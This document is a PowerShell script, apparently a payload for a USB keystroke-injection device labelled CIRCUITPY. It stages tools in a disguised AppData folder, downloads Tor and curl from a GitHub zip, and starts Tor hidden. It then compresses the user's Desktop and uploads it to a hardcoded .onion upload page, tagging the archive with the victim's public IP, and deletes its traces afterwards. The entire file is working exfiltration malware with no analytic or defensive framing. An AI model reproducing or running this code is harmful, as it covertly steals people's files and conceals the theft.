# Set paths
$targetDirectory = [Environment]::GetFolderPath("UserProfile") + "\Desktop"
$dropPath = "$env:APPDATA\.microsoft\updates"
$torPath = "$dropPath\tools\tor\tor.exe"
$torrcPath = "$dropPath\tools\tor\torrc"
$curlPath = "$dropPath\tools\curl\bin\curl.exe"
$onionURL = "rokyn4z5yzjmbwb5pr5mdes2rmogz2vzfmrvt4mx6ur5mum5bqytkcad.onion"
$uploadURL = $onionURL + "/upload.php"
$logFile = "$dropPath\tools\tor\tor.log"
$duckyLabel = "CIRCUITPY"
$privKeyDest = $dropPath + "\tools\tor\auth\auth.private"

$drive = Get-Volume | Where-Object { $_.FileSystemLabel -eq $duckyLabel }

$drivePath = "$($drive.DriveLetter):\"

$privKey = $drivePath + "\auth.private"

# Set the download URL
$toolsURL = "https://raw.githubusercontent.com/barksploit/ducky/refs/heads/master/tools.zip"

# Choose a hidden temporary path to store and extract
New-Item -ItemType Directory -Force -Path $dropPath | Out-Null

# Local path for the downloaded zip
$zipFile = "$dropPath\tools.zip"

# Download the zip file
Invoke-WebRequest -Uri $toolsURL -OutFile $zipFile

# Extract it
Expand-Archive -Path $zipFile -DestinationPath $dropPath -Force

New-Item -ItemType Directory -Path (Split-Path $privKeyDest) -Force | Out-Null

Copy-Item -Path $privKey -Destination $privKeyDest -Force

Set-Content -Path $torrcPath -Value @"
SocksPort 9050
ClientOnionAuthDir $dropPath\tools\tor\auth
Log notice file $logFile
"@

# Start Tor
$torProcess = Start-Process -FilePath $torPath -ArgumentList "-f `"$torrcPath`"" -RedirectStandardOutput "$logFile" -WindowStyle Hidden -PassThru

# Wait for Tor to bootstrap
$bootstrapped = $false
$maxWait = 30
$elapsed = 0


while (-not $bootstrapped -and $elapsed -lt $maxWait) {
    Start-Sleep -Seconds 1
    $elapsed++
    if (Test-Path $logFile) {
        $log = Get-Content $logFile -Tail 10 -ErrorAction SilentlyContinue
        if ($log -match "Bootstrapped 100%") {
            $bootstrapped = $true
        }
    }
}

# Zip user folder
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$publicIP = (Invoke-RestMethod -Uri "http://checkip.amazonaws.com").Trim()
$filename = "$dropPath\dump_${publicIP}_$timestamp.zip"
Add-Type -A 'System.IO.Compression.FileSystem'
[IO.Compression.ZipFile]::CreateFromDirectory($targetDirectory, $filename)

Start-Process -FilePath $curlPath -ArgumentList "--proxy", "socks5h://127.0.0.1:9050", "-F", "file=@$filename", $uploadURL -NoNewWindow -Wait

# After completing tasks, stop the Tor process
if ($torProcess -and !$torProcess.HasExited) {
    Stop-Process -Id $torProcess.Id -Force
}

# Cleanup
Remove-Item $dropPath
